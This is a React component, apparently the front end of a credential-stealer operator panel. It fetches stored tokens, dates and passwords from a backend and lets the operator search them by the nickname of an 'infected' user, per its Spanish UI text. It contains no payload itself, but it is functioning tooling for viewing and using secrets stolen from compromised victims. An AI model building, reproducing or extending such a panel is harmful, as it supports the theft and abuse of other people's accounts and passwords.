import { useState, useEffect } from 'react';
import axios from 'axios';
import config from './config';
import GotTokens from './tokens/GotTokens';

const Tokens = ({user}) => {
	const { DOMAIN } = config;
	const url = `${DOMAIN}/api/alpha-int-os-python-testing3`;
	const [tokens, setTokens] = useState([]);
	const [gotTokens, setGotTokens] = useState([]);
	const [search, setSearch] = useState("");
	const [error, setError] = useState([]);
	const [username, setUsername] = useState(null);

	useEffect(() => {
		const fetchTokens = async () => {
			try {
				const res = await axios.get(url, {
					headers: {
						'x-access-token': localStorage.getItem('token')
					}
				});
				setTokens(res.data.data);
				setGotTokens(res.data.data);
			} catch(e) {
				setError(e.response ? e.response.data.message : "Ocurrió un error inesperado");
			}
		}
		fetchTokens();
	}, [url]);

	useEffect(() => {
		if (user !== null) {
			setUsername(user.username);
		}
	}, [user]);

	useEffect(() => {
		const query = search.toLowerCase();
		let d = [];
		gotTokens.forEach(t => {
			const user = t.username.toLowerCase();
			if (user.indexOf(query) !== -1) {
				d.push(t);
			} 
		});
		setTokens(d);		
	}, [search]);

	const changeQuery = e => {
		setSearch(e.target.value);
	}
	return (
		<div className="container-tokens">
			<h1>
				<span>T</span>
				okens disponibles
			</h1>
			<input 
				type="text"
				placeholder="Ingresa el nick de un usuario infectado..."
				onChange={changeQuery} 
			/>
			<h2>{error}</h2>
			{username ? <h2>Welcome back <span>{username}</span>!</h2> : ""}
			<div className="tokens-box">
				{
					tokens.map(({token, date, password, _id}) => (
						<GotTokens token={token} date={date} password={password} key={_id}/>
					))
				}
			</div>
		</div>
	);
}

export default Tokens;